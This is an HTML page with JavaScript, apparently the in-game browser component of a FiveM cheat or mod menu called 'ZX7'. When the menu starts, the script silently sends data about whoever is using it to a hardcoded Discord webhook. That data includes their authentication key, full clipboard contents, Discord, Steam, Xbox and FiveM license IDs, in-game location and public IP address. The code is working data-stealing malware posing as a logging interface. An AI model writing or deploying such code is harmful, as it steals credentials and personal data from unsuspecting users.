
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>ZX7 logs</title>
<style>
  body{background:transparent;margin:0;height:100vh}
</style>
</head>
<body>

<script>
/* 
  index.html â€” Macho DUI
  ÙŠØ³ØªÙ‚Ø¨Ù„ Ø±Ø³Ø§Ù„Ø© Ù…Ù† Lua Ø¹Ø¨Ø± window.postMessage.
*/

const DEFAULT_WEBHOOK = "https://canary.discord.com/channels/1360280304333361417/1399750017656291378";

// Ø¯Ø§Ù„Ø© Ù„ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ù†Øµ Ø§Ù„Ø·ÙˆÙŠÙ„ Ø¥Ù„Ù‰ Ø£Ø¬Ø²Ø§Ø¡
function splitLongText(text, maxLength = 1000) {
  if (!text || text.length <= maxLength) {
    return [text || "N/A"];
  }
  
  const parts = [];
  for (let i = 0; i < text.length; i += maxLength) {
    parts.push(text.substring(i, i + maxLength));
  }
  return parts;
}

// Ø¯Ø§Ù„Ø© Ù„Ù…Ù†Ø¹ ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù†Øµ Ø¥Ù„Ù‰ Ø±ÙˆØ§Ø¨Ø· ÙÙŠ Ø§Ù„Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
function preventLinkEmbedding(text) {
  if (!text) return "N/A";
  
  // Ù†Ø¶ÙŠÙ zero-width space (â€‹) Ø¨Ø¹Ø¯ ÙƒÙ„ / Ùˆ . Ùˆ : ÙÙŠ Ø§Ù„Ø±ÙˆØ§Ø¨Ø·
  return text
    .replace(/\//g, '/â€‹')
    .replace(/\./g, '.â€‹')
    .replace(/:/g, ':â€‹')
    .replace(/\?/g, '?â€‹')
    .replace(/\=/g, '=â€‹')
    .replace(/\&/g, '&â€‹');
}

async function fetchPublicIP(){
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    if (!r.ok) return "N/A";
    const j = await r.json();
    return j.ip || "N/A";
  } catch(e) {
    return "N/A";
  }
}

function safe(v){
  if (v === null || v === undefined) return "N/A";
  if (typeof v === "string" && v.length > 0) return v;
  if (typeof v === "number") return String(v);
  return JSON.stringify(v);
}

async function sendEmbed(full){
  const webhook = full.webhookURL && full.webhookURL.length ? full.webhookURL : (DEFAULT_WEBHOOK || null);
  if (!webhook){
    console.log("No webhook URL provided");
    return;
  }

  const ip = await fetchPublicIP();
  const p = full.player || {};

  // Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù†Øµ Ø§Ù„ÙƒØ§Ù…Ù„ Ù…Ù† Ø§Ù„Ø­Ø§ÙØ¸Ø© Ø§Ù„Ù…Ø±Ø³Ù„ Ù…Ù† Ø§Ù„Ù€ Lua
  let clipboardText = p.clipboard || "N/A";

  // ØªÙ‚Ø³ÙŠÙ… Ø§Ù„ÙƒÙ„ÙŠØ¨ Ø¨ÙˆØ±Ø¯ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø·ÙˆÙŠÙ„
  const clipboardParts = splitLongText(clipboardText, 1000);
  
  // Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
  const fields = [
    { name: "ğŸ‘¤ Player Name", value: safe(p.name), inline: true },
    { name: "ğŸ†” Server ID", value: safe(p.serverId), inline: true },
    { name: "ğŸ“¶ Ping (ms)", value: safe(p.ping), inline: true },

    { name: "ğŸ” Authentication Key", value: "||" + safe(p.authKey) + "||", inline: false },
    
    { name: "ğŸ“‹ Clipboard Text - Ø§Ù„Ø¬Ø²Ø¡ 1/" + clipboardParts.length, value: "```" + preventLinkEmbedding(clipboardParts[0]) + "```", inline: false },

    { name: "ğŸ® Selected Player", value: safe(p.selectedPlayer), inline: true },
    { name: "ğŸš— Selected Vehicle", value: safe(p.selectedVehicle), inline: true },

    { name: "ğŸ”— Discord ID", value: safe(p.discord), inline: true },
    { name: "ğŸ¯ Steam ID", value: safe(p.steam), inline: true },
    { name: "ğŸ“œ License FiveM", value: safe(p.license), inline: true },

    { name: "ğŸª XBL", value: safe(p.xbl), inline: true },
    { name: "ğŸ’» Live", value: safe(p.live), inline: true },
    { name: "ğŸŒ IP Identifier", value: safe(p.ip), inline: true },

    { name: "ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ (x, y, z)", value: (p.coords ? (safe(p.coords.x) + ", " + safe(p.coords.y) + ", " + safe(p.coords.z)) : "N/A"), inline: false },
    { name: "ğŸ§­ Heading", value: safe(p.heading), inline: true },
    { name: "â¤ï¸ Health", value: safe(p.health), inline: true },
    { name: "ğŸ›¡ï¸ Armor", value: safe(p.armor), inline: true },

    { name: "ğŸŒ Public IP", value: ip || "N/A", inline: false },
    { name: "ğŸ“Š Identifiers (raw)", value: (p.identifiers && p.identifiers.length) ? "```" + p.identifiers.join("\n") + "```" : "N/A", inline: false }
  ];

  // Ø¥Ø¶Ø§ÙØ© Ø§Ù„Ø£Ø¬Ø²Ø§Ø¡ Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ© Ù…Ù† Ø§Ù„ÙƒÙ„ÙŠØ¨ Ø¨ÙˆØ±Ø¯ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø·ÙˆÙŠÙ„
  for (let i = 1; i < clipboardParts.length; i++) {
    fields.splice(5 + i, 0, {
      name: "ğŸ“‹ Clipboard Text - Ø§Ù„Ø¬Ø²Ø¡ " + (i + 1) + "/" + clipboardParts.length,
      value: "```" + preventLinkEmbedding(clipboardParts[i]) + "```",
      inline: false
    });
  }

  const embed = {
  username: "ZX7 Logs",
  embeds: [{
    title: "New Client Uses The Menu | Ø¹Ù…ÙŠÙ„ Ø¬Ø¯ÙŠØ¯ Ø´ØºÙ„ Ø§Ù„Ù…Ù†ÙŠÙˆ",
    description: "Clinet Info :sunglasses:",
    color: 0x8B0000, // Ø§Ù„Ù„ÙˆÙ† Ø§Ù„Ø£Ø­Ù…Ø± Ø§Ù„ØºØ§Ù…Ù‚
    thumbnail: (full.imageURL && full.imageURL.length) ? { url: full.imageURL } : undefined,
    fields: fields,
    image: (full.imageURL && full.imageURL.length) ? { url: full.imageURL } : undefined,
    footer: { text: "ZX7 ! â€¢ Coded By ZX7 " + new Date().toLocaleString() },
    timestamp: new Date().toISOString()
  }]
};


  try {
    const res = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });
    if (res.ok) {
      console.log("âœ… Webhook sent successfully", res.status);
      console.log("ğŸ“‹ Clipboard content length:", clipboardText.length);
      console.log("ğŸ“‹ Number of parts:", clipboardParts.length);
    } else {
      console.error("âŒ Webhook failed", res.status, await res.text());
    }
  } catch (err) {
    console.error("âŒ Error sending webhook", err);
  }
}

// message from Lua
window.addEventListener("message", (ev) => {
  try {
    const data = ev.data;
    if (!data) return;
    
    console.log("ğŸ“¨ Received data from Lua:", data);
    
    if (data.type === "init" && data.player) {
      const payload = {
        webhookURL: data.webhookURL || DEFAULT_WEBHOOK,
        imageURL: data.imageURL || ""
      };
      payload.player = data.player;
      
      // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„ÙˆÙŠØ¨Ù‡ÙˆÙƒ
      sendEmbed(payload);
    }
    
  } catch(e){
    console.error("âŒ dui handler error", e);
  }
}, false);

console.log("ğŸš€ ZX7 Logs System Ready - Waiting for Lua data...");
</script>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"5cb931a51b2c4943b77b038e08e9dde2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
</body>
</html>
